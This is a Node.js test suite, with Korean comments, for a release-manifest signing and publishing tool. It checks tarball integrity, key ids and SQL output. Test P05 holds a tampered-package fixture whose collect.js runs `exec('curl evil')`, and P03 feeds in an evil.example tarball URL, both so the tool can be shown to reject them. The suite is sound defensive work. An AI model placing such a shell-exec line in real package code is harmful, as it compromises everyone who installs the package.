// 릴리스 매니페스트 발행 도구 테스트, 실제 npm, 서명 키, DB에는 닿지 않는다 (가짜 의존성 주입).
const test = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const zlib = require("node:zlib");

const P = require("./publish-manifest");
const U = require("../updater");

const { privateKey, publicKey } = crypto.generateKeyPairSync("ed25519");
const PEM = privateKey.export({ type: "pkcs8", format: "pem" });
const PUBLIC = publicKey.export({ type: "spki", format: "der" }).toString("base64");
// 수집기에 내장된 운영 키 목록 대신 쓰는 테스트 키 목록
const KEYS = { k1: PUBLIC };
const VERSION = "0.2.0";
const HOME = path.join(os.tmpdir(), "charge-publish-fake-home");

// 관리자 로컬 collector/ 체크아웃을 흉내 낸 파일들
const LOCAL = {
  "package.json": JSON.stringify({ name: "charge-connect", version: VERSION, files: ["collect.js", "cloud.json"] }, null, 2),
  "collect.js": "module.exports = 'collect';\n",
  "cloud.json": "{\"url\":\"https://charge.example.invalid\"}",
};

function tgzOf(entries) {
  const parts = [];
  for (const [name, body] of entries) {
    const data = Buffer.from(body);
    const header = Buffer.alloc(512);
    header.write(`package/${name}`, 0);
    header.write("0000644\0", 100);
    header.write("0000000\0", 108);
    header.write("0000000\0", 116);
    header.write(`${data.length.toString(8).padStart(11, "0")}\0`, 124);
    header.write("00000000000\0", 136);
    header.fill(0x20, 148, 156);
    header.write("0", 156);
    header.write("ustar\0", 257);
    header.write("00", 263);
    let sum = 0;
    for (const byte of header) sum += byte;
    header.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148);
    parts.push(header, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  parts.push(Buffer.alloc(1024));
  return zlib.gzipSync(Buffer.concat(parts));
}

// 로컬 체크아웃과 레지스트리(가짜 fetch)를 만든다. packed로 레지스트리에 올라간 내용을 바꿀 수 있다.
async function withRelease(fn, { packed = LOCAL } = {}) {
  const localDir = fs.mkdtempSync(path.join(os.tmpdir(), "charge-publish-local-"));
  try {
    for (const [name, body] of Object.entries(LOCAL)) fs.writeFileSync(path.join(localDir, name), body);
    // npm pack은 package.json 끝에 줄바꿈을 붙인다, 값이 같으면 같은 릴리스로 본다
    const tgz = tgzOf(Object.entries(packed).map(([name, body]) => [name, name === "package.json" ? `${body}\n` : body]));
    const dist = { integrity: U.sha512Integrity(tgz), tarball: U.releaseTarballURL(VERSION) };
    const downloads = [];
    const fetchFn = async (url, options = {}) => {
      downloads.push(String(url));
      // 수집기와 같이 리다이렉트를 따라가지 않는다
      assert.equal(options.redirect, "error");
      if (String(url) !== dist.tarball) throw new Error(`unexpected download ${url}`);
      return new Response(tgz, { status: 200 });
    };
    return await fn({ localDir, dist, fetchFn, downloads });
  } finally {
    fs.rmSync(localDir, { recursive: true, force: true });
  }
}

function fakeFiles(files) {
  return (file) => {
    if (!(file in files)) throw Object.assign(new Error(`ENOENT ${file}`), { code: "ENOENT" });
    return files[file];
  };
}

test("P01 default --sql signs with the key under ~/.charge and prints an idempotent upsert", async () => {
  await withRelease(async ({ localDir, dist, fetchFn, downloads }) => {
    const printed = [];
    const logged = [];
    const viewed = [];
    const result = await P.main([VERSION], {
      env: {},
      home: HOME,
      readFile: fakeFiles({ [path.join(HOME, ".charge", "release-signing-key.pem")]: PEM }),
      viewDist: async (version) => { viewed.push(version); return dist; },
      viewVersions: async () => [VERSION],
      fetchFn,
      localDir,
      psql: async () => { throw new Error("--sql must not touch the database"); },
      releaseKeys: KEYS,
      out: (text) => printed.push(text),
      log: (text) => logged.push(text),
    });
    assert.deepEqual(viewed, [VERSION]);
    assert.deepEqual(downloads, [dist.tarball]);
    assert.match(logged.join("\n"), /collect\.js/);
    assert.equal(result.applied, false);
    assert.equal(result.manifest.integrity, dist.integrity);
    assert.equal(result.manifest.key_id, "k1");
    assert.equal(U.verifyReleaseSignature(result.manifest, KEYS), true);
    assert.equal(U.manifestFormatError(result.manifest), null);
    // 테스트 키는 수집기에 내장된 운영 공개키로는 통과하지 못한다
    assert.equal(U.verifyReleaseSignature(result.manifest), false);
    assert.equal(printed.join("\n"), result.sql);
    assert.match(result.sql, /insert into public\.charge_collector_releases/);
    assert.match(result.sql, /\(version, key_id, integrity, tarball, signature\)/);
    assert.ok(result.sql.includes(`'${VERSION}', 'k1', '`));
    assert.match(result.sql, /on conflict \(version\) do update/);
    assert.match(result.sql, /is distinct from/);
    assert.ok(result.sql.includes(`'${result.manifest.signature}'`));
    assert.ok(!result.sql.includes("PRIVATE KEY"));
    assert.ok(!printed.join("\n").includes("PRIVATE KEY"));
    assert.ok(!logged.join("\n").includes("PRIVATE KEY"));
  });
});

test("P02 --apply runs psql with the password file and CHARGE_SIGNING_KEY accepts PEM text or a path", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "charge-publish-"));
  try {
    const keyFile = path.join(dir, "key.pem");
    fs.writeFileSync(keyFile, PEM, { mode: 0o600 });
    for (const signingKey of [PEM, keyFile]) {
      await withRelease(async ({ localDir, dist, fetchFn }) => {
        const applied = [];
        const result = await P.main([VERSION, "--apply"], {
          env: { CHARGE_SIGNING_KEY: signingKey },
          home: HOME,
          readFile: (file, enc) => (file === path.join(HOME, ".charge", "supabase-db-password.txt") ? "db-secret\n" : fs.readFileSync(file, enc)),
          viewDist: async () => dist,
          viewVersions: async () => [VERSION],
          fetchFn,
          localDir,
          psql: async (sql, { password }) => { applied.push({ sql, password }); return " version \n 0.2.0"; },
          releaseKeys: KEYS,
          out: () => {},
          log: () => {},
        });
        assert.equal(result.applied, true);
        assert.equal(applied.length, 1);
        assert.equal(applied[0].password, "db-secret");
        assert.equal(applied[0].sql, result.sql);
      });
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("P03 wrong tarball URL, bad integrity, foreign signing key and bad arguments are refused", async () => {
  const base = {
    env: { CHARGE_SIGNING_KEY: PEM },
    home: HOME,
    readFile: fakeFiles({}),
    psql: async () => { throw new Error("must not apply"); },
    releaseKeys: KEYS,
    viewVersions: async () => [],
    out: () => {},
    log: () => {},
  };
  // 주소나 integrity 형식이 틀리면 내려받기 전에 멈춘다
  const noDownload = async () => { throw new Error("must not download"); };
  const DIST = { integrity: U.sha512Integrity(Buffer.from("tarball bytes")), tarball: U.releaseTarballURL(VERSION) };
  await assert.rejects(P.main([VERSION], { ...base, fetchFn: noDownload, viewDist: async () => ({ ...DIST, tarball: "https://evil.example/charge-connect-0.2.0.tgz" }) }), /tarball 주소/);
  await assert.rejects(P.main([VERSION], { ...base, fetchFn: noDownload, viewDist: async () => ({ ...DIST, tarball: U.releaseTarballURL("0.1.9") }) }), /tarball 주소/);
  await assert.rejects(P.main([VERSION], { ...base, fetchFn: noDownload, viewDist: async () => ({ ...DIST, integrity: "sha1-abc" }) }), /integrity/);
  await withRelease(async ({ localDir, dist, fetchFn }) => {
    const foreign = crypto.generateKeyPairSync("ed25519").privateKey.export({ type: "pkcs8", format: "pem" });
    await assert.rejects(P.main([VERSION], { ...base, localDir, fetchFn, env: { CHARGE_SIGNING_KEY: foreign }, viewDist: async () => dist }), /공개키/);
    const rsa = crypto.generateKeyPairSync("rsa", { modulusLength: 1024 }).privateKey.export({ type: "pkcs8", format: "pem" });
    await assert.rejects(P.main([VERSION], { ...base, localDir, fetchFn, env: { CHARGE_SIGNING_KEY: rsa }, viewDist: async () => dist }), /Ed25519/);
  });
  for (const argv of [
    [], ["0.2.0-beta.1"], ["0.2.0", "--sql", "--apply"], ["0.2.0", "--force"], ["0.2.0", "0.2.1"],
    ["0.2.0", "--key-id"], ["0.2.0", "--key-id", "K1"], ["0.2.0", "--key-id=k1-old"], ["0.2.0", "--key-id", "abcdefghijklmnopq"],
    ["0.2.0", "--key-id", "k1", "--key-id=k1"], ["0.2.0", "--key-id", "--apply"],
  ]) {
    await assert.rejects(P.main(argv, { ...base, fetchFn: noDownload, viewDist: async () => DIST }), undefined, JSON.stringify(argv));
  }
  // 수집기에 내장되지 않은 key id는 레지스트리를 보기도 전에 거부한다
  await assert.rejects(
    P.main([VERSION, "--key-id", "k9"], { ...base, fetchFn: noDownload, viewDist: async () => { throw new Error("must not view"); } }),
    /k9.*RELEASE_KEYS/
  );
});

test("P04 SQL literals are escaped even though validated fields cannot contain quotes", () => {
  const sql = P.upsertSQL({ version: "1.0.0", key_id: "k1", integrity: "sha512-a'b", tarball: "t", signature: "s" });
  assert.ok(sql.includes("'sha512-a''b'"));
  assert.ok(sql.includes("'1.0.0', 'k1', "));
  assert.match(sql, /set key_id = excluded\.key_id/);
});

test("P06 --key-id signs with another embedded key id, binds it in the signature and writes it to the SQL", async () => {
  const second = crypto.generateKeyPairSync("ed25519");
  const keys = { k1: PUBLIC, k2: second.publicKey.export({ type: "spki", format: "der" }).toString("base64") };
  const secondPem = second.privateKey.export({ type: "pkcs8", format: "pem" });
  const options = (extra) => ({
    home: HOME,
    readFile: fakeFiles({}),
    psql: async () => { throw new Error("must not apply"); },
    releaseKeys: keys,
    viewVersions: async () => [VERSION],
    out: () => {},
    log: () => {},
    ...extra,
  });
  for (const argv of [[VERSION, "--key-id", "k2"], ["--key-id=k2", VERSION, "--sql"]]) {
    await withRelease(async ({ localDir, dist, fetchFn }) => {
      const result = await P.main(argv, options({ env: { CHARGE_SIGNING_KEY: secondPem }, viewDist: async () => dist, fetchFn, localDir }));
      assert.equal(result.manifest.key_id, "k2", JSON.stringify(argv));
      assert.equal(U.verifyReleaseSignature(result.manifest, keys), true);
      assert.equal(U.verifyReleaseSignature({ ...result.manifest, key_id: "k1" }, keys), false, "the key id is bound by the signature");
      assert.ok(result.sql.includes(`'${VERSION}', 'k2', '`));
    });
  }
  // k1 개인키로 서명하면서 --key-id k2라고 하면 내장 키 확인에서 멈춘다
  await withRelease(async ({ localDir, dist, fetchFn }) => {
    await assert.rejects(
      P.main([VERSION, "--key-id", "k2"], options({ env: { CHARGE_SIGNING_KEY: PEM }, viewDist: async () => dist, fetchFn, localDir })),
      /key id k2/
    );
  });
});

test("P05 nothing is signed unless the registry tarball matches its integrity and the local collector files", async () => {
  // 서명 키를 읽는 순간 실패한다: 검증을 통과하기 전에는 키에 닿으면 안 된다
  const base = {
    env: {},
    home: HOME,
    readFile: () => { throw new Error("must not read the signing key"); },
    psql: async () => { throw new Error("must not apply"); },
    releaseKeys: KEYS,
    viewVersions: async () => [VERSION],
    out: () => { throw new Error("must not print SQL"); },
    log: () => {},
  };
  const { "cloud.json": _omitted, ...withoutCloud } = LOCAL;
  const cases = [
    ["registry collect.js differs from the local build", { ...LOCAL, "collect.js": "require('node:child_process').exec('curl evil');\n" }, /로컬 collector\/와 다릅니다: collect\.js/],
    ["listed file missing from the tarball", withoutCloud, /cloud\.json \(tarball에 없음\)/],
    ["registry package.json lists an extra file", {
      ...LOCAL,
      "package.json": JSON.stringify({ name: "charge-connect", version: VERSION, files: ["collect.js", "cloud.json", "extra.js"] }),
      "extra.js": "module.exports = 1;\n",
    }, /package\.json, .*extra\.js \(로컬에 없음\)/],
  ];
  for (const [label, packed, pattern] of cases) {
    await withRelease(async ({ localDir, dist, fetchFn, downloads }) => {
      await assert.rejects(P.main([VERSION], { ...base, localDir, fetchFn, viewDist: async () => dist }), pattern, label);
      assert.deepEqual(downloads, [dist.tarball], label);
    }, { packed });
  }
  // npm view가 알려준 integrity와 실제로 받은 바이트가 다르면 멈춘다
  await withRelease(async ({ localDir, dist, fetchFn }) => {
    const lying = { ...dist, integrity: U.sha512Integrity(Buffer.from("some other tarball")) };
    await assert.rejects(P.main([VERSION], { ...base, localDir, fetchFn, viewDist: async () => lying }), /integrity와 다릅니다/);
  });
});

test("P07 the key id must also be embedded in the previous npm release, so the release that first adds a key cannot be signed with it", async () => {
  const second = crypto.generateKeyPairSync("ed25519");
  const keys = { k1: PUBLIC, k2: second.publicKey.export({ type: "spki", format: "der" }).toString("base64") };
  const secondPem = second.privateKey.export({ type: "pkcs8", format: "pem" });
  const PREVIOUS = "0.1.9";
  const updaterWith = (ids) => `const RELEASE_KEYS = Object.freeze({\n${ids.map((id) => `  ${id}: "${keys[id]}",`).join("\n")}\n});\n`;
  // 직전 릴리스 tarball (updater.js가 없으면 자동 업데이트 이전 버전)
  const previousRelease = (updater, { lie = false } = {}) => {
    const entries = [["package.json", JSON.stringify({ name: "charge-connect", version: PREVIOUS, files: ["collect.js", "updater.js"] })], ["collect.js", "module.exports = 0;\n"]];
    if (updater !== null) entries.push(["updater.js", updater]);
    const tgz = tgzOf(entries);
    return { tgz, dist: { integrity: U.sha512Integrity(lie ? Buffer.from("other") : tgz), tarball: U.releaseTarballURL(PREVIOUS) } };
  };
  const attempt = (argv, { previous, pem }) => withRelease(async ({ localDir, dist, fetchFn }) => {
    const viewed = [];
    const logged = [];
    const result = await P.main(argv, {
      env: pem ? { CHARGE_SIGNING_KEY: pem } : {},
      home: HOME,
      readFile: () => { throw new Error("must not read the signing key"); },
      viewVersions: async () => ["0.1.8", PREVIOUS, VERSION, "0.3.0", "0.2.0-beta.1"],
      viewDist: async (version) => { viewed.push(version); return version === PREVIOUS ? previous.dist : dist; },
      fetchFn: async (url, options = {}) => {
        if (String(url) !== previous.dist.tarball) return fetchFn(url, options);
        assert.equal(options.redirect, "error");
        return new Response(previous.tgz, { status: 200 });
      },
      localDir,
      psql: async () => { throw new Error("must not apply"); },
      releaseKeys: keys,
      out: () => {},
      log: (text) => logged.push(text),
    });
    return { result, viewed, logged };
  });

  // 로테이션 1단계 뒤: 로컬 updater.js는 { k1, k2 }이지만 직전 릴리스는 k1만 안다. k2로 서명하면 서명 키를 읽기 전에 멈춘다
  await assert.rejects(attempt([VERSION, "--key-id", "k2"], { previous: previousRelease(updaterWith(["k1"])) }), /key id k2는 직전 릴리스 0\.1\.9의 updater\.js에 없어.*\(k1\)/);
  // 같은 릴리스를 현재 키(k1)로 서명하는 것은 된다
  const current = await attempt([VERSION], { previous: previousRelease(updaterWith(["k1"])), pem: PEM });
  assert.equal(current.result.manifest.key_id, "k1");
  assert.deepEqual(current.viewed, [PREVIOUS, VERSION]);
  assert.match(current.logged.join("\n"), /직전 릴리스 0\.1\.9: 내장 key id k1/);
  // 직전 릴리스가 이미 k2를 내장했으면 k2로 서명할 수 있다
  const rotated = await attempt([VERSION, "--key-id", "k2"], { previous: previousRelease(updaterWith(["k1", "k2"])), pem: secondPem });
  assert.equal(rotated.result.manifest.key_id, "k2");
  // 직전 릴리스에 RELEASE_KEYS가 없으면(0.1.x) 설치된 수집기가 자동 업데이트를 하지 않으므로 제약이 없다
  const first = await attempt([VERSION, "--key-id", "k2"], { previous: previousRelease(null), pem: secondPem });
  assert.equal(first.result.manifest.key_id, "k2");
  assert.match(first.logged.join("\n"), /RELEASE_KEYS 없음/);
  // 직전 릴리스 tarball이 npm integrity와 다르면 멈춘다
  await assert.rejects(attempt([VERSION], { previous: previousRelease(updaterWith(["k1"]), { lie: true }) }), /직전 릴리스 0\.1\.9 tarball이 npm view의 integrity와 다릅니다/);

  // 실제 updater.js의 목록을 글자로 읽은 결과가 내장 키 목록과 같다 (정규식이 코드 모양을 따라가는지 확인)
  const embedded = P.embeddedKeyIds(fs.readFileSync(path.join(__dirname, "..", "updater.js"), "utf8"));
  assert.deepEqual([...embedded].sort(), Object.keys(U.RELEASE_KEYS).sort());
  assert.equal(P.embeddedKeyIds("module.exports = {};"), null);
});
